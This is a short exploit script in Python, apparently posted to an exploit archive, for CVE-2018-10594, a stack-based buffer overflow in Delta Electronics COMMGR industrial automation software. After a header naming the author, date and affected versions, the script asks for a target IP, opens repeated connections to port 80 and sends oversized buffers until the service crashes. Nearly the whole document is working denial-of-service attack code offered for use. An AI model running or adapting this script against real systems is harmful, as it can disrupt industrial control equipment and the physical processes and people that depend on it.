# Exploit Title: Delta Electronics Delta Industrial Automation COMMGR
- Remote STACK-BASED BUFFER OVERFLOW
# Date: 02.07.2018
# Exploit Author: t4rkd3vilz
# Vendor Homepage: http://www.deltaww.com/
# Software Link: http://www.deltaww.com/Products/PluginWebUserControl/downloadCenterCounter.aspx?DID=2093&DocPath=1&hl=en-US
# Version:
COMMGR Version 1.08 and prior.
   DVPSimulator EH2, EH3, ES2, SE, SS2
   AHSIM_5x0, AHSIM_5x1
# Tested on: Kali Linux
# CVE : CVE-2018-10594


#Run exploit, result DOS

import socket


ip = raw_input("[+] IP to attack: ")

sarr = []
i = 0
while True:
    try:
        sarr.append(socket.create_connection((ip,80)))
        print "[+] Connection %d" % i
        crash1 = "\x41"*4412 +"\X42"*1000
        sarr[i].send(crash1+'\r\n')
        i+=1
    except socket.error:
        print "[*] Server crashed "
        raw_input()
        break